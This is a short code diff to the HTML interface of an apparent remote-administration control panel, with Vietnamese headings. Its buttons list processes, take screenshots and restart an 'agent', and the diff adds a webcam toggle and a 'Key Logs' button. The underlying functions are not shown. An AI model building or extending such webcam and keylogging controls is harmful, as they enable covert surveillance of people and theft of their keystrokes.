@@ -51,13 +51,16 @@
         <h1>Bảng điều khiển</h1>
 
         <div class="button-grid">
-          <button id="btnListProcess" onclick="getProcessCmd()">List Processes</button>
-          <button id="btnScreenshot" onclick="getScreenshotCmd()">Take Screenshot</button>
+          <button onclick="getProcessCmd()">List Processes</button>
+          <button onclick="getScreenshotCmd()">Take Screenshot</button>
 
-          <button id="btnManageApp" onclick="getAppsCmd()">List Apps</button>
-          <button id="btnSendCommand" onclick="getPingCmd()">Test Ping</button>
-          <button id="btnRestart" class="btn-restart" onclick="restartCmd()">Restart Agent</button>
-          <button id="btnShutdown" class="btn-shutdown" onclick="shutdownCmd()">Shutdown Agent</button>
+          <button onclick="getAppsCmd()">List Apps</button>
+          <button onclick="getPingCmd()">Test Ping</button>
+          <button onclick="toggleWebcam()">Webcam <span id="webcam-cmd">On</span></button>
+          <button onclick="getKeyLog()">Key Logs</button>
+          
+          <button class="btn-restart" onclick="restartCmd()">Restart Agent</button>
+          <button class="btn-shutdown" onclick="shutdownCmd()">Shutdown Agent</button>
         </div>
 
         <button id="backBtn" class="btn-back" onclick="goToMatchingPage()">Quay lại</button>
